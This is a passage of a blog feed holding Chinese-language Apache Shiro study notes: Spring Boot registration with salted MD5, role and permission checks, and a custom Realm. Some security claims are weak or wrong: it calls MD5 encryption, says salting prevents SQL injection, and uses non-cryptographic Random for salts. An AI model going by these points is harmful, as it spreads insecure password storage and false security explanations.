salt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(<span class="keyword">String</span> password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>接着对应开发对应的dao接口  UserDAO.interface<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">package</span> <span class="selector-tag">com</span><span class="selector-class">.ceit</span><span class="selector-class">.springboot_jsp_shiro</span><span class="selector-class">.dao</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">com</span><span class="selector-class">.ceit</span><span class="selector-class">.springboot_jsp_shiro</span><span class="selector-class">.entity</span><span class="selector-class">.User</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.ibatis</span><span class="selector-class">.annotations</span><span class="selector-class">.Mapper</span>;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">Mapper</span></span><br><span class="line"><span class="keyword">public</span> interface UserDAO &#123;</span><br><span class="line">    <span class="selector-tag">void</span> <span class="selector-tag">save</span>(<span class="selector-tag">User</span> <span class="selector-tag">user</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>接下来就是配置UserDAOMapper.xml了<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.ceit.springboot_jsp_shiro.dao.UserDAO"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"save"</span> <span class="attr">parameterType</span>=<span class="string">"User"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        insert into t_user values(#</span><span class="template-variable">&#123;id&#125;</span><span class="xml">,#</span><span class="template-variable">&#123;username&#125;</span><span class="xml">,#</span><span class="template-variable">&#123;password&#125;</span><span class="xml">,#</span><span class="template-variable">&#123;salt&#125;</span><span class="xml">)</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>再创建一个service包 创建一个UserService.interface<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//注册用户</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">register</span><span class="params">(User user)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>对应的UserServiceImpl.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.dao.UserDAO;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.SaltUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Md5Hash;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDAO userDAO;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//处理业务调用dao</span></span><br><span class="line">        <span class="comment">//明文密码进行md5+salt+hash散列</span></span><br><span class="line">        <span class="comment">//1. 生成随机盐</span></span><br><span class="line">        String salt = SaltUtils.getSalt(<span class="number">8</span>);</span><br><span class="line">        <span class="comment">//2. 将随机盐保存到数据</span></span><br><span class="line">        user.setSalt(salt);</span><br><span class="line">        <span class="comment">//3. 明文密码进行md5+salt+hash散列</span></span><br><span class="line">        Md5Hash md5Hash = <span class="keyword">new</span> Md5Hash(user.getPassword(),salt,<span class="number">1024</span>);</span><br><span class="line">        user.setPassword(md5Hash.toHex());</span><br><span class="line"></span><br><span class="line">        userDAO.save(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里还需要创建一个工具类 先创建一个Utils包 包下创建一个SaltUtils.class<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SaltUtils</span> &#123;</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成salt的静态方法</span></span><br><span class="line"><span class="comment">     * @param n</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> <span class="title">getSalt</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()"</span>.toCharArray();</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> aChar = chars[<span class="keyword">new</span> Random().nextInt(chars.length)];</span><br><span class="line">            sb.append(aChar);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">String</span> salt = getSalt(<span class="number">4</span>);</span><br><span class="line">        System.out.<span class="built_in">println</span>(salt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>用于生成盐</p>
<p>接着在Controller中添加<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户认证</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"register"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String register(User user)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            userService.register(user);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login.jsp"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/register.jsp"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来进行一下测试，访问register.jsp  如果注册之后 跳转到了login.jsp  登陆一下  如果成功了  那么就完成了注册的一个流程，看一下数据库中也有了对应账号和加了盐的密码</p>
<p>注意事项：</p>
<ol>
<li><p>druid依赖 直接使用druid-spring-boot-starter</p>
</li>
<li><p>xml需要加上&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</p>
</li>
<li><p>dao包下的DAO别忘了加上@Mapper</p>
</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/11/19-用户授权</title>
    <url>/2020/11/19/Shiro-2020-11-19-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="shiro中授权的概念"><a href="#shiro中授权的概念" class="headerlink" title="shiro中授权的概念"></a>shiro中授权的概念</h1><h2 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h2><p>授权，即访问控制，控制谁能访问哪些资源，主体进行身份认证后需要分配权限方可访问系统的资源，对于某些资源没有权限是无法访问的</p>
<h2 id="关键对象"><a href="#关键对象" class="headerlink" title="关键对象"></a>关键对象</h2><p>授权可简单理解为who对what(which)进行how操作</p>
<ul>
<li><p>Who 即主体(subject) 主体需要访问系统中的资源</p>
</li>
<li><p>What 即资源(Resource) 如系统菜单，页面，按钮，类方法，系统商品信息等。资源包括资源类型和资源实例</p>
</li>
<li><p>How 即权限/许可(Permission) 规定了主体对资源的操作许可，权限离开资源没有意义，如用户查询权限，用户添加权限，某个类方法的调用权限</p>
</li>
</ul>
<h2 id="授权流程"><a href="#授权流程" class="headerlink" title="授权流程"></a>授权流程</h2><p><img src="/img/JavaWeb/11-19学习日记/0.png" alt="avatar"></p>
<h2 id="授权方式"><a href="#授权方式" class="headerlink" title="授权方式"></a>授权方式</h2><h3 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h3><ul>
<li>RBAC基于角色的访问控制(Role-Based Access Control) 是以角色为中心进行访问控制<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(subject.hasRole(<span class="string">"admin"</span>)</span></span>)&#123;</span><br><span class="line">	<span class="comment">//操作什么资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="基于资源的访问控制"><a href="#基于资源的访问控制" class="headerlink" title="基于资源的访问控制"></a>基于资源的访问控制</h3><ul>
<li>RBAC基于资源的访问控制(Resource-Based Access Control) 是以资源为中心进行访问控制<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(subject.isPermission(<span class="string">"user:find:*"</span>)</span></span>)&#123;</span><br><span class="line">	<span class="comment">//对所有用户具有查询权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="权限字符串"><a href="#权限字符串" class="headerlink" title="权限字符串"></a>权限字符串</h2><p>权限字符串的规则是：资源标识符：操作：资源实例标识符，意思是对哪个资源的哪个实例具有什么操作，”:”是资源/操作/实例的分割线，权限字符串也可以使用*通配符</p>
<p>例子：</p>
<ul>
<li><p>用户创建权限：user:create,或user:create:*</p>
</li>
<li><p>用户修改实例001的权限：user:update:001</p>
</li>
<li><p>用户实例001的所有权限：user:*:001</p>
</li>
</ul>
<h1 id="shiro中的授权实现"><a href="#shiro中的授权实现" class="headerlink" title="shiro中的授权实现"></a>shiro中的授权实现</h1><ul>
<li>编程式:</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line"><span class="keyword">if</span>(subject.has<span class="constructor">Role(<span class="string">"admin"</span>)</span>)&#123;</span><br><span class="line">	<span class="comment">//有权限</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//无权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注解式:</li>
</ul>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequiresRoles</span>(<span class="string">"admin"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//有权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>标签式:</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">JSP/GSP 标签: 在JSP/GSP 页面通过相应的标签完成：</span><br><span class="line"><span class="tag">&lt;<span class="name">shiro:hasRole</span> <span class="attr">name</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">!-</span> 有权限 <span class="attr">-</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shiro:hasRole</span>&gt;</span></span><br><span class="line">注意：Thymeleaf中使用shiro需要额外集成！</span><br></pre></td></tr></table></figure>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>接着上次授权的来<br>在后面添加<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//认证用户进行授权</span></span><br><span class="line"><span class="keyword">if</span>(subject.is<span class="constructor">Authenticated()</span>)&#123;</span><br><span class="line">    <span class="comment">//基于角色权限控制</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(subject.has<span class="constructor">Role(<span class="string">"admin"</span>)</span>);;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//基于多角色权限控制</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(subject.has<span class="constructor">AllRoles(Arrays.<span class="params">asList</span>(<span class="string">"admin"</span>, <span class="string">"user"</span>)</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//基于具有其中一个角色</span></span><br><span class="line">    boolean<span class="literal">[]</span> booleans = subject.has<span class="constructor">Roles(Arrays.<span class="params">asList</span>(<span class="string">"admin"</span>, <span class="string">"super"</span>, <span class="string">"user"</span>)</span>);</span><br><span class="line">    for(boolean aBoolean:booleans)&#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(aBoolean);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"=========================================="</span>);</span><br><span class="line">    <span class="comment">//基于权限字符串的访问控制，资源标志符:操作:资源类型</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"权限："</span>+subject.is<span class="constructor">Permitted(<span class="string">"user:*:01"</span>)</span>);</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"权限："</span>+subject.is<span class="constructor">Permitted(<span class="string">"product:update"</span>)</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//分别具有哪些权限</span></span><br><span class="line">    boolean<span class="literal">[]</span> permitted = subject.is<span class="constructor">Permitted(<span class="string">"user:*:01"</span>, <span class="string">"order:*:10"</span>)</span>;</span><br><span class="line">    for(boolean b : permitted)&#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同时具有哪些权限</span></span><br><span class="line">    boolean permittedAll = subject.is<span class="constructor">PermittedAll(<span class="string">"user:*:01"</span>, <span class="string">"product:*"</span>)</span>;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(permittedAll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在CustomerMd5Realm中添加<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected AuthorizationInfo <span class="keyword">do</span><span class="constructor">GetAuthorizationInfo(PrincipalCollection <span class="params">principalCollection</span>)</span> &#123;</span><br><span class="line">    String primaryPrincipal = (String)principalCollection.get<span class="constructor">PrimaryPrincipal()</span>;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"身份信息:"</span>+primaryPrincipal);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据身份信息  用户名 获取当前用户的角色信息，以及权限信息  xiaochen admin user</span></span><br><span class="line">    SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="keyword">new</span> <span class="constructor">SimpleAuthorizationInfo()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将数据库中查询的角色信息赋值给权限对象</span></span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">Role(<span class="string">"admin"</span>)</span>;</span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">Role(<span class="string">"user"</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将数据库中查询权限信息赋值个权限对象</span></span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"user:*:01"</span>)</span>;</span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"product:create:02"</span>)</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    return simpleAuthorizationInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>到这里shiro中的授权就完成了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/11/17-MD5+Salt</title>
    <url>/2020/11/17/Shiro-2020-11-17-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="shiro中自定义Realm的实现"><a href="#shiro中自定义Realm的实现" class="headerlink" title="shiro中自定义Realm的实现"></a>shiro中自定义Realm的实现</h1><ol>
<li><p>最终执行用户名比较 SimpleAccountRealm doGetAuthenticationInfo 在这个方法中完成用户名校验</p>
</li>
<li><p>最终密码校验是在AuthenticatingRealm中 assertCredentialsMatch</p>
</li>
</ol>
<p>总结：</p>
<ul>
<li><p>AuthenticatingRealm 认证realm doGetAuthenticationInfo</p>
</li>
<li><p>AuthorizingRealm 授权realm doGetAuthorizationInfo</p>
</li>
</ul>
<p>自定义Realm的目的就是为了抛弃掉ini配置文件</p>
<p>实现与数据库和以后Spring的连接</p>
<p>创建一个realm包用于存放我们自定义的CustomerRealm<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.realm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义realm实现  将认证/授权数据的来源转为数据库</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line">    <span class="comment">//授权</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//认证</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="comment">//在token中获取用户名</span></span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="type">System</span>.out.println(principal);</span><br><span class="line">        <span class="comment">//根据身份信息使用JDBC Mybatis查询相关数据库</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">            <span class="comment">//参数1：数据库中查询到的用户名   //参数2：返回数据库中正确密码  //参数3：提供当前realm的名字 this.getName();</span></span><br><span class="line">            <span class="type">SimpleAuthenticationInfo</span> simpleAuthenticationInfo = <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(principal,<span class="string">"123"</span>,<span class="keyword">this</span>.getName());</span><br><span class="line">            <span class="keyword">return</span> simpleAuthenticationInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>写一个类来测试一下<br>TestCustomerRealmAuthenticator<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.realm.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.SecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用自定义realm</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCustomerRealmAuthenticator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="type">String</span>[] args) &#123;</span><br><span class="line">        <span class="comment">//创建securityManager</span></span><br><span class="line">        <span class="type">DefaultSecurityManager</span> defaultSecurityManager = new <span class="type">DefaultSecurityManager</span>();</span><br><span class="line">        <span class="comment">//设置自定义realm</span></span><br><span class="line">        defaultSecurityManager.setRealm(new <span class="type">CustomerRealm</span>());</span><br><span class="line">        <span class="comment">//将安全工具类设置安全工具类</span></span><br><span class="line">        <span class="type">SecurityUtils</span>.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        <span class="comment">//通过安全工具类获取subject</span></span><br><span class="line">        <span class="type">Subject</span> subject = <span class="type">SecurityUtils</span>.getSubject();</span><br><span class="line">        <span class="comment">//创建token</span></span><br><span class="line">        <span class="type">UsernamePasswordToken</span> token = new <span class="type">UsernamePasswordToken</span>(<span class="string">"xiaochen"</span>, <span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="type">UnknownAccountException</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"用户名错误"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (<span class="type">IncorrectCredentialsException</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"密码错误"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样自定义的realm就写好了  以后只需要将CustomerRealm中<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据身份信息使用JDBC Mybatis查询相关数据库</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">    <span class="comment">//参数1：数据库中查询到的用户名   //参数2：返回数据库中正确密码  //参数3：提供当前realm的名字 this.getName();</span></span><br><span class="line">    SimpleAuthenticationInfo simpleAuthenticationInfo = <span class="keyword">new</span> <span class="constructor">SimpleAuthenticationInfo(<span class="params">principal</span>,<span class="string">"123"</span>,<span class="params">this</span>.<span class="params">getName</span>()</span>);</span><br><span class="line">    return simpleAuthenticationInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>修改为JDBC或Mybatis即可</p>
<h1 id="MD5和Salt的简介和执行流程说明"><a href="#MD5和Salt的简介和执行流程说明" class="headerlink" title="MD5和Salt的简介和执行流程说明"></a>MD5和Salt的简介和执行流程说明</h1><p>刚才虽然完成了自定义realm的实现，但是还有一个问题就是，认证用的密码还在是明文存储的 </p>
<p>一般开发中都是加密和加盐的  避免安全隐患(sql注入)</p>
<ul>
<li><p>MD5算法：</p>
<ul>
<li><p>作用：一般用来加密 或者 签名(检验和)</p>
</li>
<li><p>特点：MD5算法不可逆  如果内容相同无论执行多少次md5生成结果始终是一致的</p>
</li>
<li><p>生成结果：始终是一个16进制 32位长度字符串</p>
</li>
</ul>
</li>
</ul>
<h2 id="MD5-Salt实现"><a href="#MD5-Salt实现" class="headerlink" title="MD5+Salt实现"></a>MD5+Salt实现</h2><p>先来测试一下md5的用法<br>TestShiroMD5<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.crypto.hash.Md5Hash;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> TestShiroMD5 &#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        <span class="comment">//创建一个md5算法</span></span><br><span class="line"><span class="comment">//        Md5Hash md5Hash = new Md5Hash();</span></span><br><span class="line"><span class="comment">//        md5Hash.setBytes("123".getBytes());</span></span><br><span class="line"><span class="comment">//        String s = md5Hash.toHex();</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用md5</span></span><br><span class="line">        Md5Hash md5Hash = <span class="keyword">new</span> <span class="constructor">Md5Hash(<span class="string">"123"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(md5Hash.<span class="keyword">to</span><span class="constructor">Hex()</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用md5+salt处理</span></span><br><span class="line">        Md5Hash md5Hash1 = <span class="keyword">new</span> <span class="constructor">Md5Hash(<span class="string">"123"</span>,<span class="string">"X0*7ps"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(md5Hash1.<span class="keyword">to</span><span class="constructor">Hex()</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用md5 + salt + hash散列</span></span><br><span class="line">        Md5Hash md5Hash2 = <span class="keyword">new</span> <span class="constructor">Md5Hash(<span class="string">"123"</span>, <span class="string">"X0*7ps"</span>, 1024)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(md5Hash2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">202</span>cb<span class="number">962</span>ac<span class="number">59075</span>b<span class="number">964</span>b<span class="number">07152</span>d<span class="number">234</span>b<span class="number">70</span></span><br><span class="line"><span class="number">8</span>a<span class="number">83592</span>a<span class="number">02263</span>bfe<span class="number">6752</span>b<span class="number">2</span>b<span class="number">5</span>b<span class="number">03</span>a<span class="number">4799</span></span><br><span class="line">e<span class="number">4</span>f<span class="number">9</span>bf<span class="number">3e0</span><span class="keyword">c</span><span class="number">58</span>f<span class="number">045e62</span><span class="keyword">c</span><span 